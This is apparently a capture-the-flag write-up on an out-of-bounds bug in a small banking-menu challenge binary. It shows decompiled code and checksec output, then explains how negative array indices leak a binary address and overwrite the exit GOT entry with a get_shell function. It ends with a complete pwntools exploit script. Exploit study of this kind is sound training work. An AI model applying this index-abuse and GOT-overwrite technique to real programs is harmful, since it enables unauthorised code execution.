---
title: "OUT-OF-BOUND BUG"
date: 2024-01-01 00:00:00 +0700
categories: [Binary Exploitation, Out-of-Bound]
tags: [pwn, oob, heap, ghidra]
author: datious
---
# OUT-OF-BOUND BUG
Author: D1n0_09
This related to index in the array.
```

void main(EVP_PKEY_CTX *param_1)

{
  int iVar1;
  void *pvVar2;
  long in_FS_OFFSET;
  int index;
  int menu;
  undefined8 local_20;
  
  local_20 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  init(param_1);
  puts("------ JHTBank ------");
  while( true ) {
    main_menu();
    __isoc99_scanf(&DAT_00102088,&menu);
    if (menu != 1) break;
    printf("Index: ");
    __isoc99_scanf(&DAT_00102088,&index);
    if (index < 10) {
      account_menu();
      __isoc99_scanf(&DAT_00102088,&menu);
      iVar1 = index;
      if (((menu == 4) || (menu == 3)) || (menu == 2)) {
        if (*(long *)(acc + (long)index * 0x10) == 0) {
          puts("You didn\'t create this account!");
        }
        else if (menu == 4) {
          printf("Name: %s\n",*(undefined8 *)(acc + (long)index * 0x10));
          printf("Amount: %lu\n",*(undefined8 *)(acc + (long)index * 0x10 + 8));
        }
        else if (menu == 2) {
          printf("Enter name: ");
          __isoc99_scanf(&DAT_00102104,*(undefined8 *)(acc + (long)index * 0x10));
        }
        else if (menu == 3) {
          printf("Enter amount: ");
          __isoc99_scanf(&DAT_00102118,(long)index * 0x10 + 0x103608);
        }
      }
      else if (menu == 1) {
        pvVar2 = malloc(0x50);
        *(void **)(acc + (long)iVar1 * 0x10) = pvVar2;
        printf("New name: ");
        __isoc99_scanf(&DAT_00102104,*(undefined8 *)(acc + (long)index * 0x10));
        printf("New amount: ");
        __isoc99_scanf(&DAT_00102118,(long)index * 0x10 + 0x103608);
      }
      else {
        puts("Invalid choice!");
      }
    }
    else {
      puts("You can have maximum 10 accounts");
    }
  }
                    /* WARNING: Subroutine does not return */
  exit(0);
}


```
In this program. We can see in account array that limited with ten element but index can input numbers out of account array!

1. Determine way to exploit
- First | I check security layers in program.
```
gef➤  checksec
[+] checksec for '/home/kali/Downloads/jht/oob'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✓ 
Fortify                       : ✘ 
RelRO                         : ✘ 
gef➤  

```
- Analyzing program I saw that we can input signed numbers. 
- I use gdb to debug this program.

![image](https://hackmd.io/_uploads/rk31DWaXZl.png)

- In this picture you can see location of acc array in memory with addresses. When you input signed numbers in index variable, it make pointer point out of memory which located outside acc array and point to others memory region, take advantage, attacker can leak data in those memory areas. 
- We can see that at the fifth location. In that address contained a binary  address, based on that we can compute base binary address.
- In this program also contained get_shell function. My idea is jump to get_shell function to take priviledge control program.
2. Exploit and attack
- Now, we have base binary address.
- We can get get_shell function address based on that.
- Looking at the picture above we can see got addresses. I will overwrite got address by get_shell address. But in the main function have exit function. I decided choose overwrite that got address of exit function by get_shell function through there control program.

- So, at the negative nine index we will write on that. 
```
    if (index < 10) {
      account_menu();
      __isoc99_scanf(&DAT_00102088,&menu);
      iVar1 = index;
      if (((menu == 4) || (menu == 3)) || (menu == 2)) {
        if (*(long *)(acc + (long)index * 0x10) == 0) {
          puts("You didn\'t create this account!");
        }
        else if (menu == 4) {
          printf("Name: %s\n",*(undefined8 *)(acc + (long)index * 0x10));
          printf("Amount: %lu\n",*(undefined8 *)(acc + (long)index * 0x10 + 8));
        }
        else if (menu == 2) {
          printf("Enter name: ");
          __isoc99_scanf(&DAT_00102104,*(undefined8 *)(acc + (long)index * 0x10));
        }
        else if (menu == 3) {
          printf("Enter amount: ");
          __isoc99_scanf(&DAT_00102118,(long)index * 0x10 + 0x103608);
        }
      }
``` 

- This is the place we use to overwrite.
- Here we have two branch can input. But at menu==2  that not allowed to write so I choose options menu==3 because previous this address it's not null avoid to verify of program.



3. Code script
 
 
 `#!/usr/bin/python3
from pwn import *
exe=ELF('./oob',checksec=False)
p=process(exe.path)

gdb.attach(p,gdbscript='''
b*main+132
''')
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Index: ',b'-5')
p.sendlineafter(b'> ',b'4')
p.recvuntil(b'Name: ')
leak_exe=u64(p.recvline()[:-1]+b'\0\0')
log.info("leak exe: "+hex(leak_exe))
exe.address=leak_exe-0x35b0
log.info("exe base: "+hex(exe.address))
#get shell by overwrite exit got address
p.sendlineafter(b'> ',b'1')
p.sendlineafter(b'Index: ',b'-9')
p.sendlineafter(b'> ',b'3')
p.sendlineafter(b'amount: ',str(exe.sym['get_shell']).encode())
p.sendlineafter(b'> ',b'2')




p.interactive()
`
 
 

 